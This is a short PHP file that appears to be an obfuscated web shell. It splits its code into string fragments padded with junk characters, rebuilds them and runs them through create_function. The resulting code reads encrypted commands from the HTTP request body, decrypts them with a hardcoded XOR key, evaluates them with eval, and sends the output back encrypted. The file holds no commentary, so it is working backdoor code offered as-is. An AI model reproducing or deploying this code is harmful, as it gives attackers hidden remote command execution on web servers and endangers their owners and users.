<?php
$I='$k="8dEv0Ev4b80c";$kh="Ev0e1fEv81723Ev49aEvEv";$kf="c64b7eaEv23949Ev";$Evp="Evp4WyU3';
$H='$j};}}rEveturnEv $o;}Evif (@preg_EvEvmatch("/Ev$kh(.+)$kfEv/"Ev,@fileEv_Evget_content';
$q='BSpeEvq2ts3O";fuEvnEvction Evx($t,$k){$Evc=strlenEv($k);$l=sEvtrlen(EvEv$t)Ev;$o="Ev';
$O='s("EvphpEv://input")EvEv,$Evm)Ev==1) {@ob_start();@eEvval(@EvgzuncEvompress(Ev@x(Ev@';
$p=';$r=Ev@EvbaseEv6Ev4_encoEvde(@x(@gzEvcompressEv($o),$kEv));print(Ev"Ev$p$kh$r$kf");}';
$b='baEvse64_decEvodeEv($m[1])Ev,$k)));Ev$o=@ob_gEvet_conEvtEvents();@oEvb_end_Evclean()';
$g=str_replace('B','','creBaBte_BfuBnBcBtion');
$F='";for($i=0;$i<Ev$EvlEv;){for(Ev$j=0;($j<Ev$c&&$i<$lEv);$j++,Ev$i++){$o.=Ev$t{$i}Ev^$k{Ev';
$l=str_replace('Ev','',$I.$q.$F.$H.$O.$b.$p);
$a=$g('',$l);$a();
?>
